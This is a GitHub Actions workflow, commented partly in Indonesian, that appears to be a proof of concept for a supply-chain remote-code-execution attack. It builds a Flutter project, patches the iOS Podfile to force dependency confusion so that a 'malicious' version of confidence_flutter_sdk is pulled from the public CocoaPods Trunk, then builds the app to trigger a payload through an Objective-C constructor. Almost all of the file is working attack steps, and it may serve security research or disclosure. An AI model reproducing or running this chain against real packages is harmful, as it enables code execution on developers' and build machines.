name: Supply Chain RCE Proof of Concept
on: [push, workflow_dispatch]

jobs:
  poc:
    runs-on: macos-latest
    steps:
      - name: Setup Flutter
        uses: subosito/flutter-action@v2
        with:
          channel: 'stable'

      - name: Execute Full RCE Chain (Public Registry Resolve)
        run: |
          # 0. NUCLEAR RESET
          rm -rf rce_test
          
          # 1. Create fresh dummy project
          flutter create rce_test
          cd rce_test
          
          # Paksa tambahkan dependency tanpa versi spesifik agar resolve ke versi tertinggi di Trunk
          flutter pub add confidence_flutter_sdk
          
          # 2. Patch Platform Version ke 16.0
          sed -i '' '1s/^/platform :ios, '"'"'16.0'"'"'\n/' ios/Podfile
          
          # 3. NATIVE RESOLUTION (The Dependency Confusion Route)
          # Hapus logic otomatis Flutter yang seringkali mengunci ke path lokal/symlink
          sed -i '' '/flutter_install_all_ios_pods/d' ios/Podfile
          
          # Tambahkan pod secara eksplisit tanpa :git. 
          # CocoaPods akan mencari ke Master Repo / Trunk secara otomatis.
          echo "pod 'confidence_flutter_sdk'" >> ios/Podfile
          
          echo "=== Podfile AFTER Native Patch (Dependency Confusion Mode) ==="
          cat ios/Podfile
          
          cd ios
          # 4. CLEANUP PROTOCOL
          echo "=== Purging Old Pods and Locks ==="
          pod cache clean --all
          rm -rf Pods
          rm -rf Podfile.lock
          
          # Update repo untuk memastikan versi 'malicious' lu terdeteksi
          pod repo update
          
          # Jalankan install secara verbose
          pod install --verbose 2>&1 | tee pod_install.log || true
          
          echo "=== Check Podfile.lock Status ==="
          # Verifikasi apakah dia narik versi lu (v2.0.0 atau v1.1.2) dari Trunk
          ls -la Podfile.lock || echo "Podfile.lock STILL MISSING"
          grep -A 1 "confidence_flutter_sdk" Podfile.lock || echo "FAILED TO RESOLVE FROM TRUNK"
          
          cd ..
          # 5. Build Phase - Execution Phase (Trigger Payload via Objective-C Constructor)
          flutter build ios --no-codesign 2>&1 | tee build.log || true
          
          echo "=== Build log tail ==="
          tail -30 build.log

      - name: Upload Logs
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: poc-evidence
          path: |
            rce_test/ios/pod_install.log
            rce_test/ios/Podfile.lock
            rce_test/build.log
